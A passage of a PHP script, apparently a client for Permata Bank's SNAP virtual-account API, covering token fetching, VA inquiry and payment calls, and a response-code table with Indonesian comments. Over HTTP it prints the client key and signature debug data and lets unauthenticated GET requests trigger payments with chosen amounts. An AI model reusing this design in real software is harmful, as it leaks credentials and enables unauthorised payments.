        'X-EXTERNAL-ID: '         . $externalId,
        'CHANNEL-ID: '            . SNAP_CHANNEL_ID,
    ];

    $bodyHash = strtolower(hash('sha256', minifyJson($jsonBody)));
    $debug = [
        'endpoint'     => $url,
        'snap_path'    => $snapPath,
        'timestamp'    => $timestamp,
        'external_id'  => $externalId,
        'body'         => $jsonBody,
        'body_sha256'  => $bodyHash,
        'string2sign'  => 'POST:' . $snapPath . ':' . $accessToken . ':' . $bodyHash . ':' . $timestamp,
        'x_signature'  => $signature,
    ];

    $result = httpPost($url, $headers, $jsonBody);

    if ($result['error']) {
        return [
            'success'   => false,
            'error'     => 'cURL error: ' . $result['error'],
            'http_code' => $result['http_code'],
            'raw'       => '',
            'debug'     => $debug,
        ];
    }

    $decoded = json_decode($result['response'], true);
    $rc      = $decoded['responseCode']    ?? '';
    $msg     = $decoded['responseMessage'] ?? '';
    $success = ($rc === '2002500');

    return [
        'success'              => $success,
        'response_code'        => $rc,
        'response_message'     => $msg,
        'virtual_account_data' => $decoded['virtualAccountData'] ?? [],
        'payment_flag_reason'  => $decoded['paymentFlagReason']  ?? [],
        'http_code'            => $result['http_code'],
        'raw'                  => $result['response'],
        'error'                => $success ? '' : "[$rc] $msg",
        'debug'                => $debug,
    ];
}
// ---- end _doPayment()

// ==============================================================
// ======== TABEL RESPONSE CODE SNAP BI (dari source code) ======
// ==============================================================
//
//  TOKEN (/b2b/token):
//    2007300  = Successful
//    400XX01  = Invalid field format {field}
//    400XX02  = Missing mandatory field {field}
//    401XX00  = Unauthorized signature (x-client-key tidak ditemukan)
//
//  INQUIRY (/inquiry):
//    2002400  = Successful
//    4002400  = Bad request
//    4002401  = Invalid field format {field}
//    4002402  = Missing mandatory field {field}
//    4012400  = Unauthorized (header tidak valid / missing)
//    4012401  = Access token invalid atau expired
//    4042415  = Transaction Not Permitted (invalid req/response)
//    4092400  = Conflict (x-external-id duplikat)
//
//  PAYMENT (/payment):
//    2002500  = Successful
//    4002500  = Bad request
//    4002501  = Invalid field format {field}
//    4002502  = Missing mandatory field {field}
//    4012500  = Unauthorized (header tidak valid / missing)
//    4012501  = Access token invalid atau expired
//    4042515  = Transaction Not Permitted
//    4092500  = Conflict (x-external-id duplikat)

// ==============================================================
// =================== OUTPUT HELPER ===========================
// ==============================================================

function printSection(string $title): void
{
    $line = str_repeat('=', 62);
    echo "\n$line\n $title\n$line\n";
}

function printResult(array $result, bool $showDebug = false): void
{
    $icon = ($result['success'] ?? false) ? 'OK' : 'FAIL';
    echo "[$icon] HTTP " . ($result['http_code'] ?? '-') . "\n";

    if (!empty($result['error'])) {
        echo "  Error  : " . $result['error'] . "\n";
    }

    $skip = ['raw', 'debug', 'error', 'success', 'http_code'];
    foreach ($result as $k => $v) {
        if (in_array($k, $skip, true)) continue;
        if (is_array($v) && !empty($v)) {
            echo "  $k:\n";
            echo "    " . json_encode($v, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
        } elseif (!is_array($v) && $v !== '') {
            echo "  $k: $v\n";
        }
    }

    if ($showDebug && !empty($result['debug'])) {
        echo "\n  -- DEBUG --\n";
        foreach ($result['debug'] as $k => $v) {
            echo "  $k: $v\n";
        }
    }

    if (!empty($result['raw'])) {
        echo "\n  -- RAW RESPONSE --\n";
        $pretty = json_decode($result['raw'], true);
        echo ($pretty !== null)
            ? json_encode($pretty, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n"
            : $result['raw'] . "\n";
    }
}

// ==============================================================
// ======================== MAIN ================================
// ==============================================================

$isCli     = (PHP_SAPI === 'cli');
$action    = $isCli ? ($argv[1] ?? 'demo') : ($_GET['action'] ?? 'demo');
$showDebug = $isCli
    ? in_array('--debug', $argv ?? [])
    : isset($_GET['debug']);

if (!$isCli) {
    header('Content-Type: text/plain; charset=utf-8');
}

echo "================================================================\n";
echo " Permata Bank SNAP API (permata-switching_v1.0_pro)\n";
echo " Waktu  : " . date('Y-m-d H:i:s') . "\n";
echo " Server  : " . SNAP_BASE_URL . "\n";
echo " Profil  : " . $_ACTIVE_PROFILE . " (" . SNAP_SUPPLIER_NAME . ")\n";
echo " Partner : " . SNAP_PARTNER_ID . "\n";
echo " ClientKey: " . SNAP_CLIENT_KEY . "\n";
echo "================================================================\n";

switch ($action) {

    // ---- Token saja ------------------------------------------
    case 'token':
        printSection('Generate Token B2B (raw)');
        printResult(generateToken(), $showDebug);
        break;

    // ---- Inquiry — token otomatis ----------------------------
    case 'inquiry':
        $bin    = $isCli ? ($argv[2] ?? SNAP_BIN)                : ($_GET['bin']         ?? SNAP_BIN);
        $custNo = $isCli ? ($argv[3] ?? '000000001')              : ($_GET['customer_no'] ?? '000000001');
        $vaNo   = $isCli ? ($argv[4] ?? SNAP_BIN.'001060001361')  : ($_GET['va_no']       ?? SNAP_BIN.'001060001361');

        printSection("VA Inquiry (token otomatis)  VA: $vaNo");
        $inq = vaInquiry($bin, $custNo, $vaNo);
        if ($showDebug) {
            echo "  [token] " . ($inq['token_from_cache'] ? 'dari cache' : 'baru') .
                 " | " . substr($inq['access_token_used'] ?? '', 0, 16) . "...\n";
        }
        printResult($inq, $showDebug);
        break;

    // ---- Payment — token otomatis ----------------------------
    case 'payment':
        $bin      = $isCli ? ($argv[2] ?? SNAP_BIN)                : ($_GET['bin']          ?? SNAP_BIN);
        $custNo   = $isCli ? ($argv[3] ?? '000000001')              : ($_GET['customer_no']  ?? '000000001');
        $vaNo     = $isCli ? ($argv[4] ?? SNAP_BIN.'001060001361')  : ($_GET['va_no']        ?? SNAP_BIN.'001060001361');
        $paidAmt  = (float)($isCli ? ($argv[5] ?? '100000')        : ($_GET['paid_amount']  ?? '100000'));
        $totalAmt = (float)($isCli ? ($argv[6] ?? '100000')        : ($_GET['total_amount'] ?? '100000'));

        printSection("VA Payment (token otomatis)  VA: $vaNo  IDR " . number_format($paidAmt));
        $pay = vaPayment($bin, $custNo, $vaNo, '', $paidAmt, $totalAmt);
        if ($showDebug) {
            echo "  [token] " . ($pay['token_from_cache'] ? 'dari cache' : 'baru') .
                 " | " . substr($pay['access_token_used'] ?? '', 0, 16) . "...\n";
        }
        printResult($pay, $showDebug);
        break;

    // ---- Inquiry + Payment sekaligus (token 1x) --------------
    case 'inquiry_payment':
        $bin      = $isCli ? ($argv[2] ?? SNAP_BIN)                : ($_GET['bin']          ?? SNAP_BIN);
        $custNo   = $isCli ? ($argv[3] ?? '000000001')              : ($_GET['customer_no']  ?? '000000001');
        $vaNo     = $isCli ? ($argv[4] ?? SNAP_BIN.'001060001361')  : ($_GET['va_no']        ?? SNAP_BIN.'001060001361');
        $paidAmt  = (float)($isCli ? ($argv[5] ?? '100000')        : ($_GET['paid_amount']  ?? '100000'));
        $totalAmt = (float)($isCli ? ($argv[6] ?? '100000')        : ($_GET['total_amount'] ?? '100000'));

        // Token di-fetch sekali, dipakai untuk inquiry DAN payment via cache
        printSection("Step 1 - VA Inquiry (auto token)  VA: $vaNo");
        $inq = vaInquiry($bin, $custNo, $vaNo);
        echo "  [token] " . ($inq['token_from_cache'] ? 'dari cache' : 'baru fetch') . "\n";
        printResult($inq, $showDebug);

        if (!$inq['success']) {
            echo "\nInquiry gagal. Payment dibatalkan.\n";
            break;
        }

        // Token sudah di cache — payment pakai token yang sama
        printSection("Step 2 - VA Payment (token dari cache)  IDR " . number_format($paidAmt));
        $pay = vaPayment($bin, $custNo, $vaNo, '', $paidAmt, $totalAmt);
        echo "  [token] " . ($pay['token_from_cache'] ? 'dari cache ✓' : 'baru fetch') . "\n";
        printResult($pay, $showDebug);
        break;

    // ---- Full demo -------------------------------------------
    case 'demo':
    default:
        echo "\nMode DEMO — Token diambil otomatis, tidak perlu diisi manual.\n";

        $bin  = SNAP_BIN;
        $vaNo = $bin . '001060001361';
        echo " BIN: $bin | VA: $vaNo\n";

        // Inquiry — token di-fetch otomatis, disimpan cache
        printSection("Step 1 - VA Inquiry (auto token)  VA: $vaNo");
        $inq = vaInquiry($bin, '000000001', $vaNo);
        echo "  [token] " . ($inq['token_from_cache'] ? 'dari cache' : 'baru fetch') .
             " | " . substr($inq['access_token_used'] ?? '', 0, 16) . "...\n";
        printResult($inq, $showDebug);

        // Payment — token sudah ada di cache, tidak fetch ulang
        printSection("Step 2 - VA Payment (token cache)  VA: $vaNo  IDR 100.000");
        $pay = vaPayment($bin, '000000001', $vaNo, '', 100000, 100000);
        echo "  [token] " . ($pay['token_from_cache'] ? 'dari cache ✓' : 'baru fetch') .
             " | " . substr($pay['access_token_used'] ?? '', 0, 16) . "...\n";
        printResult($pay, $showDebug);

        break;
}

echo "\n================================================================\n";
echo " Selesai - " . date('Y-m-d H:i:s') . "\n";
echo "================================================================\n";

/*
 * ================================================================
 * CARA INTEGRASI DARI KODE LAIN
 * ================================================================
 *
 *   require_once 'permatabank_api_real.php';
 *
 *   // Inquiry VA — token diambil OTOMATIS, tidak perlu generate manual
 *   $inq = vaInquiry('7406', '081234567890', '7406001060001361');
 *   if ($inq['success']) {
 *       $va = $inq['virtual_account_data'];
 *       echo "Nama    : " . ($va['name'] ?? '-') . "\n";
 *       echo "Nominal : " . ($va['totalAmount']['value'] ?? '-') . "\n";
 *   } else {
 *       echo "Inquiry gagal: " . $inq['error'] . "\n";
 *   }
 *
 *   // Payment VA — token sudah di cache dari inquiry di atas (1x fetch)
 *   $pay = vaPayment('7406', '081234567890', '7406001060001361',
 *                    '', 150000, 150000, 'IDR');
 *   if ($pay['success']) echo "Pembayaran berhasil!\n";
 *
 * ================================================================
 * CLI COMMANDS:
 * ================================================================
 *   php permatabank_api_real.php demo
 *   php permatabank_api_real.php demo --debug
 *   php permatabank_api_real.php token                              # raw token saja
 *   php permatabank_api_real.php inquiry 7406 081234567890 7406001060001361
 *   php permatabank_api_real.php payment 7406 081234567890 7406001060001361 150000 150000
 *   php permatabank_api_real.php inquiry_payment 7406 081234567890 7406001060001361 150000 150000
 *
 * HTTP QUERY:
 *   ?action=demo
 *   ?action=token
 *   ?action=inquiry&bin=7406&customer_no=081234567890&va_no=7406001060001361
 *   ?action=payment&bin=7406&va_no=7406001060001361&paid_amount=150000&total_amount=150000
 *   ?action=inquiry_payment&bin=7406&customer_no=081234567890&va_no=7406001060001361&paid_amount=150000&total_amount=150000
 *   ?action=demo&debug=1
 * ================================================================
 */
